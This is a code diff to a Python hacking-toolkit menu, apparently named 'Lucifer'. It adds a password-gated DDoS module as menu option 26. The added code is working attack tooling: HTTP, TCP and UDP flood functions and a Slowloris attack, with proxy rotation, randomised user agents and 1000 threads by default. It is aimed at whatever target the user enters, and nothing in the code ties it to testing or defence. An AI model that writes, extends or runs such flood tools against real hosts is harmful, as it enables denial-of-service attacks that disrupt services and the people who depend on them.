@@ -972,9 +972,444 @@ def web_hacking_tools():
     tool.main()
 
 
-# ----------------------------- #
-# Main Menu
-# ----------------------------- #
+# !/usr/bin/env python3
+import os
+import sys
+import time
+import socket
+import threading
+import random
+import requests
+import hashlib  # Add this import
+from concurrent.futures import ThreadPoolExecutor
+
+GREEN = "\033[1;32m"
+RED = "\033[1;31m"
+CYAN = "\033[1;36m"
+YELLOW = "\033[1;33m"
+RESET = "\033[0m"
+
+# DDoS Tools Password Hash
+DDOS_PASSWORD_HASH = "b9be22ceeaff67c04ec261290ab9edcc12600b9336922ca0960fd0d911e9725a"
+
+
+class DDoSTools:
+    def __init__(self):
+        self.attack_running = False
+        self.requests_sent = 0
+        self.proxies = []
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36",
+            "Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0"
+        ]
+
+    def banner(self):
+        print(f"""
+{RED}
+╔══════════════════════════════════════╗
+║             DDOS TOOLS              ║
+║           [Lucifer Edition]         ║
+╚══════════════════════════════════════╝
+{RESET}
+        """)
+
+    def check_ddos_password(self):
+        """DDoS Tools Password Protection"""
+        attempts = 0
+        max_attempts = 3
+
+        while attempts < max_attempts:
+            print(f"{CYAN}\n╔══════════════════════════════════════╗")
+            print(f"║           DDOS TOOLS ACCESS           ║")
+            print(f"╚══════════════════════════════════════╝{RESET}")
+            print(f"{YELLOW}[!] DDoS Tools are password protected{RESET}")
+
+            password = input(f"{CYAN}[?] Enter DDoS Tools Password: {RESET}")
+            entered_hash = hashlib.sha256(password.encode()).hexdigest()
+
+            if entered_hash == DDOS_PASSWORD_HASH:
+                print(f"{GREEN}[+] Access Granted to DDoS Tools!{RESET}")
+                time.sleep(1)
+                return True
+            else:
+                attempts += 1
+                remaining = max_attempts - attempts
+                print(f"{RED}[-] Incorrect Password! {remaining} attempts remaining{RESET}")
+                time.sleep(1)
+
+        print(f"{RED}[!] Maximum attempts reached. Returning to main menu...{RESET}")
+        return False
+
+    def parse_proxy(self, proxy_string):
+        """Parse proxy string in format host:port:username:password"""
+        try:
+            parts = proxy_string.split(':')
+            if len(parts) == 4:
+                host, port, username, password = parts
+                return {
+                    'http': f'http://{username}:{password}@{host}:{port}',
+                    'https': f'https://{username}:{password}@{host}:{port}'
+                }
+            elif len(parts) == 2:
+                host, port = parts
+                return {
+                    'http': f'http://{host}:{port}',
+                    'https': f'https://{host}:{port}'
+                }
+        except:
+            pass
+        return None
+
+    def load_proxies(self):
+        """Load proxies from user input"""
+        print(f"\n{CYAN}[=== PROXY SETUP ===]{RESET}")
+        print(f"{YELLOW}[!] Enter proxies in format: host:port:username:password{RESET}")
+        print(f"{YELLOW}[!] Or: host:port (for no auth){RESET}")
+        print(f"{YELLOW}[!] Enter 'done' when finished{RESET}")
+
+        self.proxies = []
+        while True:
+            proxy_input = input(f"{CYAN}[?] Enter proxy: {RESET}").strip()
+
+            # Check if user wants to finish
+            if proxy_input.lower() == 'done' or proxy_input == '':
+                break
+
+            proxy = self.parse_proxy(proxy_input)
+            if proxy:
+                self.proxies.append(proxy)
+                print(f"{GREEN}[+] Proxy added: {proxy_input}{RESET}")
+            else:
+                print(f"{RED}[-] Invalid proxy format! Use: host:port:user:pass or host:port{RESET}")
+
+        print(f"{GREEN}[+] Loaded {len(self.proxies)} proxies{RESET}")
+        input(f"{YELLOW}Press Enter to continue...{RESET}")
+
+    def get_random_proxy(self):
+        """Get random proxy from loaded proxies"""
+        if self.proxies:
+            return random.choice(self.proxies)
+        return None
+
+    def get_random_user_agent(self):
+        """Get random user agent"""
+        return random.choice(self.user_agents)
+
+    def http_flood(self, target, duration, threads_count):
+        """HTTP Flood Attack"""
+        print(f"\n{CYAN}[=== HTTP FLOOD ATTACK ===]{RESET}")
+        print(f"{GREEN}[*] Target: {target}{RESET}")
+        print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
+        print(f"{GREEN}[*] Threads: {threads_count}{RESET}")
+        print(f"{GREEN}[*] Proxies: {len(self.proxies)}{RESET}")
+        print(f"{YELLOW}[!] Attack starting in 3 seconds...{RESET}")
+        time.sleep(3)
+
+        self.attack_running = True
+        self.requests_sent = 0
+        start_time = time.time()
+
+        def attack_thread():
+            while self.attack_running and (time.time() - start_time) < duration:
+                try:
+                    proxy = self.get_random_proxy()
+                    headers = {
+                        'User-Agent': self.get_random_user_agent(),
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Accept-Encoding': 'gzip, deflate',
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'no-cache'
+                    }
+
+                    if proxy:
+                        response = requests.get(target, headers=headers, proxies=proxy, timeout=5)
+                    else:
+                        response = requests.get(target, headers=headers, timeout=5)
+
+                    self.requests_sent += 1
+                    print(f"{GREEN}[+] Request #{self.requests_sent} - Status: {response.status_code}{RESET}", end='\r')
+
+                except Exception as e:
+                    self.requests_sent += 1
+                    print(f"{RED}[-] Request #{self.requests_sent} - Failed: {str(e)[:50]}{RESET}", end='\r')
+
+        # Start threads
+        threads = []
+        for _ in range(threads_count):
+            thread = threading.Thread(target=attack_thread)
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
+
+        # Monitor attack
+        try:
+            while time.time() - start_time < duration:
+                elapsed = time.time() - start_time
+                rps = self.requests_sent / elapsed if elapsed > 0 else 0
+                print(f"{YELLOW}[*] Elapsed: {elapsed:.1f}s | Requests: {self.requests_sent} | RPS: {rps:.1f}{RESET}",
+                      end='\r')
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")
+
+        self.attack_running = False
+        total_time = time.time() - start_time
+        print(f"\n{GREEN}[+] Attack completed!{RESET}")
+        print(f"{GREEN}[+] Total requests: {self.requests_sent}{RESET}")
+        print(f"{GREEN}[+] Total time: {total_time:.1f} seconds{RESET}")
+        print(f"{GREEN}[+] Average RPS: {self.requests_sent / total_time:.1f}{RESET}")
+
+    def tcp_flood(self, target, port, duration, threads_count):
+        """TCP Flood Attack"""
+        print(f"\n{CYAN}[=== TCP FLOOD ATTACK ===]{RESET}")
+        print(f"{GREEN}[*] Target: {target}:{port}{RESET}")
+        print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
+        print(f"{GREEN}[*] Threads: {threads_count}{RESET}")
+        print(f"{YELLOW}[!] Attack starting in 3 seconds...{RESET}")
+        time.sleep(3)
+
+        self.attack_running = True
+        self.requests_sent = 0
+        start_time = time.time()
+
+        def attack_thread():
+            while self.attack_running and (time.time() - start_time) < duration:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    sock.connect((target, port))
+
+                    # Send random data
+                    data = os.urandom(1024)
+                    sock.send(data)
+                    sock.close()
+
+                    self.requests_sent += 1
+                    print(f"{GREEN}[+] TCP Packet #{self.requests_sent} sent{RESET}", end='\r')
+
+                except Exception as e:
+                    self.requests_sent += 1
+                    print(f"{RED}[-] TCP Packet #{self.requests_sent} failed{RESET}", end='\r')
+
+        # Start threads
+        threads = []
+        for _ in range(threads_count):
+            thread = threading.Thread(target=attack_thread)
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
+
+        # Monitor attack
+        try:
+            while time.time() - start_time < duration:
+                elapsed = time.time() - start_time
+                pps = self.requests_sent / elapsed if elapsed > 0 else 0
+                print(f"{YELLOW}[*] Elapsed: {elapsed:.1f}s | Packets: {self.requests_sent} | PPS: {pps:.1f}{RESET}",
+                      end='\r')
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")
+
+        self.attack_running = False
+        total_time = time.time() - start_time
+        print(f"\n{GREEN}[+] Attack completed!{RESET}")
+        print(f"{GREEN}[+] Total packets: {self.requests_sent}{RESET}")
+        print(f"{GREEN}[+] Total time: {total_time:.1f} seconds{RESET}")
+        print(f"{GREEN}[+] Average PPS: {self.requests_sent / total_time:.1f}{RESET}")
+
+    def udp_flood(self, target, port, duration, threads_count):
+        """UDP Flood Attack"""
+        print(f"\n{CYAN}[=== UDP FLOOD ATTACK ===]{RESET}")
+        print(f"{GREEN}[*] Target: {target}:{port}{RESET}")
+        print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
+        print(f"{GREEN}[*] Threads: {threads_count}{RESET}")
+        print(f"{YELLOW}[!] Attack starting in 3 seconds...{RESET}")
+        time.sleep(3)
+
+        self.attack_running = True
+        self.requests_sent = 0
+        start_time = time.time()
+
+        def attack_thread():
+            while self.attack_running and (time.time() - start_time) < duration:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+                    # Send random UDP data
+                    data = os.urandom(512)
+                    sock.sendto(data, (target, port))
+                    sock.close()
+
+                    self.requests_sent += 1
+                    print(f"{GREEN}[+] UDP Packet #{self.requests_sent} sent{RESET}", end='\r')
+
+                except Exception as e:
+                    self.requests_sent += 1
+                    print(f"{RED}[-] UDP Packet #{self.requests_sent} failed{RESET}", end='\r')
+
+        # Start threads
+        threads = []
+        for _ in range(threads_count):
+            thread = threading.Thread(target=attack_thread)
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
+
+        # Monitor attack
+        try:
+            while time.time() - start_time < duration:
+                elapsed = time.time() - start_time
+                pps = self.requests_sent / elapsed if elapsed > 0 else 0
+                print(f"{YELLOW}[*] Elapsed: {elapsed:.1f}s | Packets: {self.requests_sent} | PPS: {pps:.1f}{RESET}",
+                      end='\r')
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")
+
+        self.attack_running = False
+        total_time = time.time() - start_time
+        print(f"\n{GREEN}[+] Attack completed!{RESET}")
+        print(f"{GREEN}[+] Total packets: {self.requests_sent}{RESET}")
+        print(f"{GREEN}[+] Total time: {total_time:.1f} seconds{RESET}")
+        print(f"{GREEN}[+] Average PPS: {self.requests_sent / total_time:.1f}{RESET}")
+
+    def slowloris_attack(self, target, duration, threads_count):
+        """Slowloris Attack"""
+        print(f"\n{CYAN}[=== SLOWLORIS ATTACK ===]{RESET}")
+        print(f"{GREEN}[*] Target: {target}{RESET}")
+        print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
+        print(f"{GREEN}[*] Threads: {threads_count}{RESET}")
+        print(f"{YELLOW}[!] Attack starting in 3 seconds...{RESET}")
+        time.sleep(3)
+
+        self.attack_running = True
+        self.requests_sent = 0
+        start_time = time.time()
+
+        def attack_thread():
+            while self.attack_running and (time.time() - start_time) < duration:
+                try:
+                    # Create partial HTTP requests
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(10)
+                    sock.connect((target, 80))
+
+                    # Send partial request headers
+                    headers = f"GET / HTTP/1.1\r\nHost: {target}\r\n"
+                    headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+                    headers += "Content-Length: 42\r\n"
+
+                    sock.send(headers.encode())
+                    self.requests_sent += 1
+
+                    # Keep connection open
+                    while self.attack_running and (time.time() - start_time) < duration:
+                        time.sleep(10)
+                        sock.send(b"X-a: b\r\n")
+
+                    sock.close()
+
+                except Exception:
+                    pass
+
+        # Start threads
+        threads = []
+        for _ in range(threads_count):
+            thread = threading.Thread(target=attack_thread)
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
+
+        # Monitor attack
+        try:
+            while time.time() - start_time < duration:
+                elapsed = time.time() - start_time
+                print(f"{YELLOW}[*] Elapsed: {elapsed:.1f}s | Connections: {threads_count}{RESET}", end='\r')
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")
+
+        self.attack_running = False
+        print(f"\n{GREEN}[+] Slowloris attack completed!{RESET}")
+
+    def show_menu(self):
+        """Show DDoS tools menu"""
+        print(f"""
+{CYAN}[1]{RESET} HTTP Flood Attack
+{CYAN}[2]{RESET} TCP Flood Attack  
+{CYAN}[3]{RESET} UDP Flood Attack
+{CYAN}[4]{RESET} Slowloris Attack
+{CYAN}[5]{RESET} Load Proxies ({len(self.proxies)} loaded)
+{CYAN}[0]{RESET} Back to Main Menu
+        """)
+
+    def main(self):
+        """Main DDoS tools function"""
+        if not self.check_ddos_password():
+            return
+
+        self.banner()
+
+        while True:
+            self.show_menu()
+            choice = input(f"{YELLOW}[?] Select attack type: {RESET}")
+
+            if choice == '1':  # HTTP Flood
+                target = input("[?] Enter target URL (http://example.com): ").strip()
+                duration = int(input("[?] Enter attack duration (seconds): "))
+                threads = int(input("[?] Enter threads (default 1000): ") or "1000")
+
+                if not target.startswith(('http://', 'https://')):
+                    target = 'http://' + target
+
+                self.http_flood(target, duration, threads)
+
+            elif choice == '2':  # TCP Flood
+                target = input("[?] Enter target IP: ").strip()
+                port = int(input("[?] Enter target port: "))
+                duration = int(input("[?] Enter attack duration (seconds): "))
+                threads = int(input("[?] Enter threads (default 1000): ") or "1000")
+
+                self.tcp_flood(target, port, duration, threads)
+
+            elif choice == '3':  # UDP Flood
+                target = input("[?] Enter target IP: ").strip()
+                port = int(input("[?] Enter target port: "))
+                duration = int(input("[?] Enter attack duration (seconds): "))
+                threads = int(input("[?] Enter threads (default 1000): ") or "1000")
+
+                self.udp_flood(target, port, duration, threads)
+
+            elif choice == '4':  # Slowloris
+                target = input("[?] Enter target URL or IP: ").strip()
+                duration = int(input("[?] Enter attack duration (seconds): "))
+                threads = int(input("[?] Enter threads (default 500): ") or "500")
+
+                self.slowloris_attack(target, duration, threads)
+
+            elif choice == '5':  # Load Proxies
+                self.load_proxies()
+
+            elif choice == '0':  # Exit
+                print(f"{GREEN}[+] Returning to main menu...{RESET}")
+                break
+            else:
+                print(f"{RED}[-] Invalid choice!{RESET}")
+
+            input(f"\n{YELLOW}Press Enter to continue...{RESET}")
+
+
+# Add this function to your main menu
+def ddos_tools():
+    """DDoS Tools Entry Point"""
+    tools = DDoSTools()
+    tools.main()
+
+
 def menu():
     while True:
         clear()
@@ -1008,6 +1443,7 @@ def menu():
 23. Lucifer SMS Bomber
 24. Password Tools
 25. Web Hacking Tools
+26. Lucifer DDOS Tools
 0. Exit
 """)
 
@@ -1063,6 +1499,8 @@ def menu():
             password_tools()
         elif choice == "25":
             web_hacking_tools()
+        elif choice == "26":
+            ddos_tools()
         elif choice == "0":
             clear()
             print("Goodbye Lucifer!")
